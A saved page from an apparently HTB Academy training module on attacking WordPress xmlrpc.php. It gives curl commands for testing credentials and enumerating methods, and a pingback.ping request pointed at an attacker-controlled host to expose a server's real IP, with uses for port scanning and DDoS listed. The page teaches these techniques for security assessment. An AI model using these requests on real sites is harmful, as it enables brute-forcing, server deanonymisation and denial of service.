---
created: 2023-12-18T15:36:01 (UTC -08:00)
tags: []
source: https://enterprise.hackthebox.com/academy-lab/7282/3329/modules/17/88
author: 
---

# HTB Enterprise

> ## Excerpt
> It is important to note that xmlrpc.php being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, xmlrpc.php can facilitate some enumeration and exploitation activities, though.

---
# Attacking WordPress 'xmlrpc.php'

It is important to note that `xmlrpc.php` being enabled on a WordPress instance is not a vulnerability. Depending on the methods allowed, `xmlrpc.php` can facilitate some enumeration and exploitation activities, though.

Let us borrow an example from our [Hacking Wordpress](https://enterprise.hackthebox.com/academy-lab/7282/preview/modules/17) module.

Suppose we are assessing the security of a WordPress instance residing in _http://blog.inlanefreight.com_. Through enumeration activities, we identified a valid username, `admin`, and that `xmlrpc.php` is enabled. Identifying if `xmlrpc.php` is enabled is as easy as requesting `xmlrpc.php` on the domain we are assessing.

We can mount a password brute-forcing attack through `xmlrpc.php`, as follows.

```
<span>p3ta@htb</span><span class="color-green">[/htb]</span><code class=" language-shell-session"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -X POST -d <span class="token string">"&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;CORRECT-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://blog.inlanefreight.com/xmlrpc.php</span></span>

<span class="token output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;array&gt;&lt;data&gt;
  &lt;value&gt;&lt;struct&gt;
  &lt;member&gt;&lt;name&gt;isAdmin&lt;/name&gt;&lt;value&gt;&lt;boolean&gt;1&lt;/boolean&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;url&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;blogid&lt;/name&gt;&lt;value&gt;&lt;string&gt;1&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;blogName&lt;/name&gt;&lt;value&gt;&lt;string&gt;Inlanefreight&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
  &lt;member&gt;&lt;name&gt;xmlrpc&lt;/name&gt;&lt;value&gt;&lt;string&gt;http://blog.inlanefreight.com/xmlrpc.php&lt;/string&gt;&lt;/value&gt;&lt;/member&gt;
&lt;/struct&gt;&lt;/value&gt;
&lt;/data&gt;&lt;/array&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;
</span></code>
```

Above, you can see a successful login attempt through `xmlrpc.php`.

We will receive a `403 faultCode` error if the credentials are not valid.

```
<span>p3ta@htb</span><span class="color-green">[/htb]</span><code class=" language-shell-session"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -X POST -d <span class="token string">"&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;admin&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;WRONG-PASSWORD&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://blog.inlanefreight.com/xmlrpc.php</span></span>

<span class="token output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodResponse&gt;
  &lt;fault&gt;
    &lt;value&gt;
      &lt;struct&gt;
        &lt;member&gt;
          &lt;name&gt;faultCode&lt;/name&gt;
          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
        &lt;/member&gt;
        &lt;member&gt;
          &lt;name&gt;faultString&lt;/name&gt;
          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;
        &lt;/member&gt;
      &lt;/struct&gt;
    &lt;/value&gt;
  &lt;/fault&gt;
&lt;/methodResponse&gt;
</span></code>
```

You may ask how we identified the correct method to call (_system.listMethods_). We did that by going through the well-documented [Wordpress code](https://codex.wordpress.org/XML-RPC/system.listMethods) and interacting with `xmlrpc.php`, as follows.

```
<span>p3ta@htb</span><span class="color-green">[/htb]</span><code class=" language-shell-session"><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -s -X POST -d <span class="token string">"&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;"</span> http://blog.inlanefreight.com/xmlrpc.php</span></span>

<span class="token output">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;array&gt;&lt;data&gt;
  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
&lt;/data&gt;&lt;/array&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;
</span></code>
```

Inside the list of available methods above, [pingback.ping](https://codex.wordpress.org/XML-RPC_Pingback_API) is included. `pingback.ping` allows for XML-RPC pingbacks. According to WordPress, _a [pingback](https://wordpress.com/support/comments/pingbacks/) is a special type of comment that’s created when you link to another blog post, as long as the other blog is set to accept pingbacks._

Unfortunately, if pingbacks are available, they can facilitate:

-   IP Disclosure - An attacker can call the `pingback.ping` method on a WordPress instance behind Cloudflare to identify its public IP. The pingback should point to an attacker-controlled host (such as a VPS) accessible by the WordPress instance.
-   Cross-Site Port Attack (XSPA) - An attacker can call the `pingback.ping` method on a WordPress instance against itself (or other internal hosts) on different ports. Open ports or internal hosts can be identified by looking for response time differences or response differences.
-   Distributed Denial of Service Attack (DDoS) - An attacker can call the `pingback.ping` method on numerous WordPress instances against a single target.

Find below how an IP Disclosure attack could be mounted if `xmlrpc.php` is enabled and the `pingback.ping` method is available. XSPA and DDoS attacks can be mounted similarly.

Suppose that the WordPress instance residing in _http://blog.inlanefreight.com_ is protected by Cloudflare. As we already identified, it also has `xmlrpc.php` enabled, and the `pingback.ping` method is available.

As soon as the below request is sent, the attacker-controlled host will receive a request (pingback) originating from _http://blog.inlanefreight.com_, verifying the pingback and exposing _http://blog.inlanefreight.com_'s public IP address.

Code: http

```
--&gt; POST /xmlrpc.php HTTP/1.1 
<span class="token header-name keyword">Host:</span> blog.inlanefreight.com 
<span class="token header-name keyword">Connection:</span> keep-alive 
<span class="token header-name keyword">Content-Length:</span> 293

&lt;methodCall&gt;
&lt;methodName&gt;pingback.ping&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;http://attacker-controlled-host.com/&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;value&gt;&lt;string&gt;https://blog.inlanefreight.com/2015/10/what-is-cybersecurity/&lt;/string&gt;&lt;/value&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
```

If you have access to our [Hacking Wordpress](https://enterprise.hackthebox.com/academy-lab/7282/preview/modules/17) module, please note that you won't be able to exploit the availability of the `pingback.ping` method against the related section's target, due to egress restrictions.
